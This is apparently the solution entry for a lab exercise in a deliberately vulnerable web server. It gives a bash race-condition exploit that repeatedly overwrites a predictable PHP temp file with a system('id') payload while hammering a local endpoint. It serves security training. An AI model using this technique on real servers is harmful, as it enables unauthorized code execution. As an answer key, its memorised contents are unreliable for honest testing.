# Solution — 06 · Insecure Temp File Race

**Code**: `mime_type_handler.cpp` → `/tmp/php_script_<pid>.php`.

Requires local shell access on the server host.

```bash
# In one terminal: overwrite the temp file as fast as possible.
PID=$(pgrep damn_vulnerable_web)
while :; do
    echo "<?php system('id'); ?>" > "/tmp/php_script_${PID}.php" 2>/dev/null
done

# In another terminal: trigger PHP requests until the race wins.
while :; do curl -s http://127.0.0.1:8081/echo.php; done
```
